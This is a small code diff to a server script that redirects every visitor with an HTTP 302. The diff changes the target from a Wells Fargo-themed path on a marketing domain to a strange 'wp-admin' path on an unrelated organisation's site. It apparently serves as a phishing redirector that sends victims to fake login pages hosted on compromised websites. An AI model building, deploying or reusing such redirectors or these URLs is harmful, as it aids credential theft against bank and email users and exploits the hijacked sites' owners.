@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://cabo.marketing/.well-known/secure/wellsfargo/", // Replace this with your actual link
+      Location: "https://lasikleaders.org/wp-admin/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
